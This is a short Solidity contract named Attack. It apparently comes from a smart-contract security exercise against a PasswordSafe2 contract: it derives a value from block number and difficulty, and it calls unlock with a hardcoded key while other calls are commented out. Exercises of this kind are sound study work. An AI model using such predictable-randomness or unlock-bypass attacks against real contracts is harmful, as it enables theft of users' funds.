pragma solidity ^0.6.0;

import "./passwordsafe2.sol";

contract Attack {

    PasswordSafe2 public token;

    address public owner;

    constructor(address _address) public {
        token = PasswordSafe2(_address);
        owner = msg.sender;
    }

    function attack() public {
        uint256 useThis = uint256(block.number*block.difficulty % 5);
        bytes32 name = "0x123";
        uint256 skey = 123;
        bytes32 pw = "0x123";
        
        /*
        token.addPassword(useThis, name, skey, pw);
        */
        //token.getOTP();
        token.unlock(skey);
    }
}